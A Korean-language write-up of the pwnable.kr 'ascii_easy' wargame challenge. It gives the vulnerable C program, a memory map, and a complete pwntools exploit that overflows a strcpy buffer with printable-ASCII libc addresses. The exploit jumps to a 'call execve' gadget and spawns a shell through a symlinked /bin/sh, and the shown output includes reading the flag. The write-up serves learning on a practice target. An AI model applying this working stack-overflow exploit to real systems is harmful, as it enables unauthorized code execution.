# [pwnable.kr] ascii_easy writeup

#### [summary] call execve, symbolic link

```shell
We often need to make 'printable-ascii-only' exploit payload.  You wanna try?

hint : you don't necessarily have to jump at the beggining of a function. try to land anyware.


ssh ascii_easy@pwnable.kr -p2222 (pw:guest)
```

이틀동안 캐삽질해서 겨우 푼 문제다;;

입력에 필터 걸어놓는거 진짜 싫음

### code

```shell
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>

#define BASE ((void*)0x5555e000)

int is_ascii(int c){
    if(c>=0x20 && c<=0x7f) return 1;
    return 0;
}

void vuln(char* p){
    char buf[20];
    strcpy(buf, p); // <= (누가봐도)vulnerable !!
}

void main(int argc, char* argv[]){

    if(argc!=2){
        printf("usage: ascii_easy [ascii input]\n");
        return;
    }

    size_t len_file;
    struct stat st;
    int fd = open("/home/ascii_easy/libc-2.15.so", O_RDONLY);
    if( fstat(fd,&st) < 0){
        printf("open error. tell admin!\n");
        return;
    }

    len_file = st.st_size;
    if (mmap(BASE, len_file, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE, fd, 0) != BASE){
        printf("mmap error!. tell admin\n");
        return;
    }

    int i;
    for(i=0; i<strlen(argv[1]); i++){
        if( !is_ascii(argv[1][i]) ){
            printf("you have non-ascii byte!\n");
            return;
        }
    }

    printf("triggering bug...\n");
    vuln(argv[1]);

}

```

libc를 부가적으로 제공하며 해당 libc는 `0x5555e000`에 올라간다. 특이사항으로는 실행권한뿐만아니라 쓰기권한까지 존재한다.

```shell
gdb-peda$ vmmap
Start      End        Perm	Name
0x08048000 0x08049000 r-xp	/home/ascii_easy/ascii_easy
0x08049000 0x0804a000 r--p	/home/ascii_easy/ascii_easy
0x0804a000 0x0804b000 rw-p	/home/ascii_easy/ascii_easy
0x0804b000 0x0806c000 rw-p	[heap]
0x5555e000 0x55702000 rwxp	/home/ascii_easy/libc-2.15.so   <========= critical!
0xf7e05000 0xf7e06000 rw-p	mapped
0xf7e06000 0xf7fb6000 r-xp	/lib/i386-linux-gnu/libc-2.23.so
0xf7fb6000 0xf7fb8000 r--p	/lib/i386-linux-gnu/libc-2.23.so
0xf7fb8000 0xf7fb9000 rw-p	/lib/i386-linux-gnu/libc-2.23.so
0xf7fb9000 0xf7fbc000 rw-p	mapped
0xf7fd3000 0xf7fd4000 rw-p	mapped
0xf7fd4000 0xf7fd7000 r--p	[vvar]
0xf7fd7000 0xf7fd9000 r-xp	[vdso]
0xf7fd9000 0xf7ffc000 r-xp	/lib/i386-linux-gnu/ld-2.23.so
0xf7ffc000 0xf7ffd000 r--p	/lib/i386-linux-gnu/ld-2.23.so
0xf7ffd000 0xf7ffe000 rw-p	/lib/i386-linux-gnu/ld-2.23.so
0xfffdd000 0xffffe000 rw-p	[stack]
```



#### 처음 생각한 아이디어

주어진 libc의 위치는 고정이기 때문에 결국 문제에서 의도하는 것은 저 위치의 ascii 주소를 갖는 함수를 이용하는 것이라고 생각했다. 그래서 `execve()`나 `system()`을 이용하려 찾아보았지만 해당 주소들에 ascii 범위를 벗어나는 값들이 있어서 다른 방법을 생각해보았다.

우선 가장 귀찮은 녀석인 `is_ascii()`를 우회하기 위해서 입력을 다시 받는 아이디어를 떠올렸다.

찾아보니 `gets()`의 주소가 모두 ascii 범위 내에 있어서 인자로 대충 주어진 libc 영역을 줘서 쉘코드를 쓴 뒤, 쉘코드로 return 하면 쉘을 딸 수 있다는 각이 섰는데....

각만 섰다... `gets()`를 실행하는 중간에 터지던데 아직도 왜 그런지 원인을 잘 모르겠다... ㅜ



암튼 그러다가 `call execve`를 이용하라는 힌트를 얻음...



### exploit

```python
#!/usr/bin/python
from pwn import *

# 실패 가젯 ㅠ
#gets = 0x555c3e30
#buf = 0x556d5555
call_execve = 0x5561676a
error = 0x556b7c56
null = 0x556f7640

_argv = 'A'*32
_argv += p32(call_execve)
_argv += p32(error)
_argv += p32(null)
_argv += p32(null)


r = process(['/home/ascii_easy/ascii_easy', _argv])

r.interactive()
```

`call execve()`를 이용했기 때문에, ret를 신경쓰지 않고 바로 인자를 주면 된다.

`execve()`에 인자로 줄 /bin/sh를 만드는 것이 큰 문제였는데, 방법을 잘 모르겠어서 그냥 이를 대체할 수 있는 프로그램을 만들기로 했다. 대충 __"error"__라는 문자열을 이용해서 심볼릭 링크로 실행시키기로 함.

```shell
ascii_easy@prowl:/tmp/charlie4$ ln -s /bin/sh error
ascii_easy@prowl:/tmp/charlie4$ export PATH=$PATH:/tmp/charlie4
ascii_easy@prowl:/tmp/charlie4$ error
$ exit

```



### result

```shell
ascii_easy@prowl:/tmp/charlie4$ python sol2_ascii.py 
[+] Starting local process '/home/ascii_easy/ascii_easy': pid 110832
[*] Switching to interactive mode
triggering bug...
$ id
uid=1040(ascii_easy) gid=1040(ascii_easy) egid=1041(ascii_easy_pwn) groups=1041(ascii_easy_pwn),1040(ascii_easy)
$ cat /home/ascii_easy/flag
damn you ascii armor... what a pain in the ass!! :(

```



### reflection

`execve()`에서 /bin/sh의 심볼릭 링크인 error를 첫번째 인자로 주는데에는 성공했으나, 두 번째, 세 번째 인자를 어떻게 주어야 할 지 모르겠어, 나름대로 짱구를 굴려서 시도해보았다.

저 놈의 `is_ascii()`떄문에 두 번째, 세 번째 인자에 모두 0을 줄 수가 없어서 어떻게 무시할 수 있는 방법이 없을까 싶었다. /bin/sh에 이상한 인자를 주면 제대로 실행이 되지 않는 것을 보고, 아래와 같이 그냥 shell을 실행시켜주는 함수이지만 인자를 대충 줘도 되는 프로그램을 만들어서 error로 만들었는데,

```c
#include <stdio.h>
int main(int argc, char* argv[]){
    execve("/bin/sh", NULL, NULL);
}
```

이러면 두 번째, 세 번째 인자에 이상한 값이 들어와도 괜찮을 줄 알았으나... 두 번째, 세 번째 인자에는 argv 배열 및 env 배열의 주소 값이 들어가는 걸 간과했다;;;

정상적인 주소 값이 아니기 때문에 일단 초반에 인자를 가져오는 과정에서 터졌다...

`gets()`가 안돼는 이유는 아직도 잘 모르겠지만, 요거는 이유를 찾아서 다행이다..